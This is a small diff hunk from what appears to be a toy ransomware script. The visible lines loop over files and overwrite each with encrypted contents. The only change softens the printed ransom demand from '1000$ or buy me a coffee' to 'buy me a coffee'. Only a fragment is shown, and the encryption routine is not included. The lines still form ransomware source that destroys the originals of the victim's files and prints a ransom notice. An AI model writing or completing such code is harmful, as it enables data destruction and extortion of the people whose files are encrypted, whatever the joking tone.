@@ -23,4 +23,4 @@ for file in files:
 	with open(file,"wb") as the_file:
 		the_file.write(encrypted_contents)
 
-print("RANSOM! Your files are now encryted, send me 1000$ or buy me a coffee to get the secret message")
+print("RANSOM! Your files are now encryted, buy me a coffee to get the secret message")
